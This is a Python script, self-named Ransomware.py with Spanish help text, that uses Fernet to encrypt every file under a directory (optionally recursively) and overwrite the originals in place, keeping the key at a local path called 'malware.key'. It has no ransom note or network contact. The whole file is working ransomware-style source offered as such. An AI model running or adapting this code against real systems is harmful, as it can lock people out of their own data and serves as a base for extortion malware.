import os
import getopt
import sys

# pip install cryptography

from cryptography.fernet import Fernet


def generate_key(file_key):
    path = os.path.dirname(file_key)
    os.makedirs(path, exist_ok=True)
    key = Fernet.generate_key()
    if not os.path.exists(file_key):
        with open(file_key, "wb") as file:
            file.write(key)


def get_key(file_key):
    generate_key(file_key)
    with open(file_key, "rb") as file:
        key = file.read()
    return key


def get_files(path, recursive=False):
    if recursive:
        return [os.path.join(dir, file) for (dir, _, files) in os.walk(path) for file in files]
    else:
        return [file for file in os.listdir(path) if os.path.isfile(file)]


def encrypt_files(path, file_key, recursive=False):
    key = get_key(file_key)
    for name_file in get_files(path, recursive):
        with open(name_file, "rb") as file:
            contents = file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(name_file, "wb") as file:
            file.write(contents_encrypted)


def decrypt_files(path, file_key, recursive=False):
    key = get_key(file_key)
    for name_file in get_files(path, recursive):
        with open(name_file, "rb") as file:
            contents = file.read()
        contents_decrypted = Fernet(key).decrypt(contents)
        with open(name_file, "wb") as file:
            file.write(contents_decrypted)


def no_options_valid(options):
    return (('-e', '') in options or ('--encrypt', '') in options) and \
        (('-d', '') in options or ('--decrypt', '') in options)


def usage():
    print("Usage:\npython Ransomware.py [options]")
    print("\nGeneral Options:")
    print("-h, --help\t\tMostrar ayuda")
    print("-e, --encrypt\t\tEncriptar archivos")
    print("-d, --decrypt\t\tDesencriptar archivos")
    print("-r, --recursive\t\tEncriptar/desencriptar recursivo")
    print("-p, --path\t\tRuta archivos a encriptar/desencriptar")
    print("-k, --key\t\tArchivo de la clave encriptar/desencriptar")
    exit(0)


def program(args, path_files, file_key):
    recursive = False
    encrypt = True
    help = False
    usage() if len(args) < 2 else None
    argv = args[1:]
    opts = ["help", "encrypt", "decrypt", "path=", "recursive", "key="]
    try:
        options, args = getopt.getopt(argv, "p:k:hedr", opts)
    except Exception as e:
        usage()
    usage() if no_options_valid(options) else None
    options_valid = False
    for name, value in options:
        if name in ['-h', '--help']:
            help = True
            options_valid = True
        elif name in ['-e', '--encrypt']:
            options_valid = True
        elif name in ['-d', '--decrypt']:
            encrypt = False
            options_valid = True
        elif name in ['-p', '--path']:
            path_files = value
            options_valid = True
        elif name in ['-r', '--recursive']:
            recursive = True
            options_valid = True
        elif name in ['-k', '--key']:
            file_key = value
            options_valid = True
    usage() if not options_valid else None
    usage() if help else None
    if encrypt:
        encrypt_files(path_files, file_key, recursive)
    else:
        decrypt_files(path_files, file_key, recursive)


if __name__ == '__main__':
    path_files = 'C:\\datos\\' # Cambiar ruta
    file_key = 'C:\\malware\\malware.key' # Cambiar ruta

    program(sys.argv, path_files, file_key)
